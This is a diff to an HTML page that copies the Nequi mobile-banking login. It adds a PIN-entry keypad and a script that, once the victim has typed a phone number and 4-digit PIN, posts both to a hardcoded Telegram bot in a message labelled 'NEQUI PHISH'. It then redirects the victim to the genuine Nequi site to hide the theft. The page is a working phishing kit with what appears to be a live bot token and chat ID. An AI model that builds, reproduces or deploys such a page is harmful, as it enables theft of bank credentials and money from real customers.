@@ -5,135 +5,275 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Nequi</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
     
     * { margin:0; padding:0; box-sizing:border-box; }
     body { 
       font-family: 'Roboto', sans-serif; 
-      background: #1F0A2E;
+      background: #1F0829;
       height: 100vh; 
       color: white;
       overflow: hidden;
     }
-    .container {
+
+    /* ==================== PANTALLA 1 ==================== */
+    #screen1, #screen2 {
       max-width: 420px;
       margin: 0 auto;
-      padding: 20px;
       height: 100vh;
+      padding: 20px;
       display: flex;
       flex-direction: column;
-      background: linear-gradient(#2C0B3A, #1F0A2E);
+      background: #1F0829;
+      position: absolute;
+      width: 100%;
+      top: 0;
     }
 
-    .top-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 10px 0 20px 0;
-    }
-    .bancolombia-logo {
-      font-size: 22px;
-      font-weight: 700;
-      color: #FF2D95;
-    }
     .help {
-      width: 28px; 
-      height: 28px;
-      border: 2px solid #FFFFFF;
+      position: absolute;
+      top: 25px;
+      right: 25px;
+      width: 32px;
+      height: 32px;
+      border: 2px solid rgba(255,255,255,0.9);
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 17px;
-      color: white;
+      font-size: 18px;
+      z-index: 10;
     }
 
     .nequi-logo {
-      text-align: center;
-      font-size: 54px;
+      margin-top: 110px;
+      font-size: 62px;
       font-weight: 700;
-      margin: 60px 0 90px 0;
+      text-align: center;
       color: white;
     }
-    .nequi-logo span { color: #FF2D95; }
+    .nequi-logo span {
+      color: #FF2D95;
+      margin-right: 10px;
+    }
 
     .label {
       text-align: center;
-      font-size: 17px;
-      margin-bottom: 25px;
-      color: #E0C0FF;
+      margin: 70px 0 30px 0;
+      font-size: 17.5px;
+      color: #D8B5E8;
     }
 
-    .input-wrapper {
-      background: #2A1840;
-      border: 2px solid #2A1840;     /* Mismo color del centro */
+    .input-box {
+      background: #2C1642;
       border-radius: 12px;
-      padding: 4px;
+      padding: 5px;
     }
 
     input {
       width: 100%;
-      background: #2A1840;
+      background: #2C1642;
       color: white;
       border: none;
-      border-radius: 10px;
       padding: 18px 20px;
-      font-size: 17.5px;
+      font-size: 17px;
+      border-radius: 10px;
       outline: none;
     }
-    input::placeholder {
-      color: #B89ED4;
-    }
 
-    /* Fix fuerte para autocompletado */
     input:-webkit-autofill,
     input:-webkit-autofill:hover,
     input:-webkit-autofill:focus {
       -webkit-text-fill-color: white !important;
-      -webkit-box-shadow: 0 0 0 30px #2A1840 inset !important;
-      background-color: #2A1840 !important;
+      -webkit-box-shadow: 0 0 0 30px #2C1642 inset !important;
     }
 
     button {
       margin-top: auto;
       height: 58px;
-      background: #FF2D95;
+      background: linear-gradient(to right, #FF2D95, #E6007E);
       color: white;
       border: none;
       border-radius: 12px;
-      font-size: 17px;
+      font-size: 17.5px;
       font-weight: 500;
-      box-shadow: 0 5px 15px rgba(255, 45, 149, 0.35);
+      box-shadow: 0 6px 20px rgba(255, 45, 149, 0.4);
     }
+
+    /* ==================== PANTALLA 2 (Clave) ==================== */
+    .back {
+      position: absolute;
+      top: 25px;
+      left: 20px;
+      font-size: 30px;
+      cursor: pointer;
+      z-index: 10;
+    }
+
+    .title {
+      margin-top: 80px;
+      text-align: center;
+      font-size: 26px;
+      font-weight: 500;
+    }
+
+    .pins {
+      margin: 50px 0 30px 0;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+    .pin {
+      width: 58px;
+      height: 58px;
+      background: #E0B0FF;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 34px;
+      color: #3C0A55;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+
+    .message {
+      text-align: center;
+      color: #C8A2E0;
+      font-size: 15.5px;
+      line-height: 1.45;
+    }
+
+    .keyboard {
+      margin-top: auto;
+      margin-bottom: 40px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 18px 35px;
+      padding: 0 30px;
+      font-size: 34px;
+    }
+    .key {
+      height: 70px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255,255,255,0.09);
+      border-radius: 50%;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+    }
+    .key:active { background: rgba(255,255,255,0.25); }
+    .delete { font-size: 26px !important; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="top-bar">
-      <div class="bancolombia-logo">bancolombia</div>
-      <div class="help">?</div>
+
+  <!-- ====================== PANTALLA 1 ====================== -->
+  <div id="screen1">
+    <div class="help">?</div>
+    
+    <div class="nequi-logo">
+      <span>■</span>Nequi
     </div>
 
-    <div class="nequi-logo">Nequi <span>■</span></div>
-    
     <div class="label">Ingresa tu número de celular</div>
 
-    <div class="input-wrapper">
+    <div class="input-box">
       <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
     </div>
 
-    <button onclick="nextScreen()">Entra</button>
+    <button onclick="goToPassword()">Entra</button>
+  </div>
+
+  <!-- ====================== PANTALLA 2 ====================== -->
+  <div id="screen2" style="display:none;">
+    <div class="back" onclick="goBack()">←</div>
+    <div class="title">Escribe tu clave</div>
+
+    <div class="pins" id="pins">
+      <div class="pin"></div>
+      <div class="pin"></div>
+      <div class="pin"></div>
+      <div class="pin"></div>
+    </div>
+
+    <div class="message">
+      No dudamos que seas tú...<br>
+      Pero es mejor confirmar ;)
+    </div>
+
+    <div class="keyboard">
+      <div class="key" onclick="addDigit(1)">1</div>
+      <div class="key" onclick="addDigit(2)">2</div>
+      <div class="key" onclick="addDigit(3)">3</div>
+      <div class="key" onclick="addDigit(4)">4</div>
+      <div class="key" onclick="addDigit(5)">5</div>
+      <div class="key" onclick="addDigit(6)">6</div>
+      <div class="key" onclick="addDigit(7)">7</div>
+      <div class="key" onclick="addDigit(8)">8</div>
+      <div class="key" onclick="addDigit(9)">9</div>
+      <div class="key"></div>
+      <div class="key" onclick="addDigit(0)">0</div>
+      <div class="key delete" onclick="deleteDigit()">✕</div>
+    </div>
   </div>
 
   <script>
-    function nextScreen() {
+    let pin = "";
+    const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
+    const chatId = "773351137";
+
+    function goToPassword() {
       const phone = document.getElementById("phone").value.trim();
-      if (phone.length < 10) {
-        alert("Por favor ingresa un número de celular válido");
+      if (phone.length < 9) {
+        alert("Por favor ingresa un número válido");
         return;
       }
       localStorage.setItem("phone", phone);
-      window.location.href = "clave.html";
+      document.getElementById("screen1").style.display = "none";
+      document.getElementById("screen2").style.display = "block";
+    }
+
+    function addDigit(num) {
+      if (pin.length < 4) {
+        pin += num;
+        updatePins();
+        if (pin.length === 4) sendData();
+      }
+    }
+
+    function deleteDigit() {
+      pin = pin.slice(0, -1);
+      updatePins();
+    }
+
+    function updatePins() {
+      const boxes = document.querySelectorAll('#pins .pin');
+      boxes.forEach((box, i) => {
+        box.textContent = i < pin.length ? "●" : "";
+      });
+    }
+
+    function sendData() {
+      const phone = localStorage.getItem("phone") || "Sin número";
+
+      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 Clave: ${pin}\n⏰ ${new Date().toLocaleString('es-CO')}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).catch(err => console.log("Error enviando a Telegram"));
+
+      setTimeout(() => {
+        window.location.href = "https://www.nequi.com.co";
+      }, 1500);
+    }
+
+    function goBack() {
+      document.getElementById("screen2").style.display = "none";
+      document.getElementById("screen1").style.display = "flex";
+      pin = "";
+      updatePins();
     }
   </script>
 </body>
